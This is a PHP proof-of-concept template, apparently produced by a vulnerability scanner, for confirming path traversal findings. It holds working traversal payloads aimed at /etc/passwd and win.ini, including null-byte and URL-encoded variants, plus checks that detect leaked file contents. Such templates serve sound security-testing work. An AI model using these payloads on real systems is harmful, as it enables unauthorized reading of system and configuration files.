<?php
/**
 * PoC Template: Path Traversal
 * Auto-generated from ZeroKit finding
 * 
 * Vulnerability: {{CATEGORY}}
 * Location: {{FILE}}:{{LINE}}
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "====================================\n";
echo "🎯 PoC: Path Traversal\n";
echo "Location: {{FILE}}:{{LINE}}\n";
echo "====================================\n\n";

// =====================================================
// EXPLOIT PAYLOADS
// =====================================================
$payload_basic = "../../../etc/passwd";
$payload_windows = "..\\..\\..\\windows\\win.ini";
$payload_null_byte = "../../../etc/passwd\x00.txt";
$payload_encoded = "..%2f..%2f..%2fetc%2fpasswd";

echo "[*] Testing path traversal: $payload_basic\n";

// =====================================================
// VULNERABLE CODE EXECUTION
// =====================================================
// Template manager will replace this section with actual vulnerable code
$output = '';
$code = '';
ob_start();
// VULNERABLE_CODE_PLACEHOLDER
$output = ob_get_clean();

// =====================================================
// VERIFICATION
// =====================================================
$success = false;

// Check for /etc/passwd content
if (preg_match('/root:.*:0:0:/i', $output)) {
    echo "✅ VULNERABILITY CONFIRMED: /etc/passwd accessed\n";
    $success = true;
}

// Check for Windows system files
if (preg_match('/\[fonts\]|\[extensions\]/i', $output)) {
    echo "✅ VULNERABILITY CONFIRMED: Windows system file accessed\n";
    $success = true;
}

// Check for file read errors (indicates path was processed)
if (preg_match('/(failed to open|No such file|Permission denied)/i', $output)) {
    echo "⚠️  Path traversal attempted but file not accessible\n";
    echo "    (Still vulnerable if error reveals internal paths)\n";
    $success = true;
}

// Check if sanitization exists
if (!empty($code) && !preg_match('/(basename|realpath|Path::validate)/i', $code)) {
    echo "⚠️  NO PATH SANITIZATION DETECTED\n";
}

// =====================================================
// RESULT
// =====================================================
echo "\n====================================\n";
if ($success) {
    echo "🚨 RESULT: EXPLOITABLE (Path Traversal)\n";
    echo "Severity: {{SEVERITY}}\n";
    echo "Impact: Arbitrary file read, config disclosure\n";
    exit(0);
} else {
    echo "❌ RESULT: NOT EXPLOITABLE\n";
    exit(1);
}
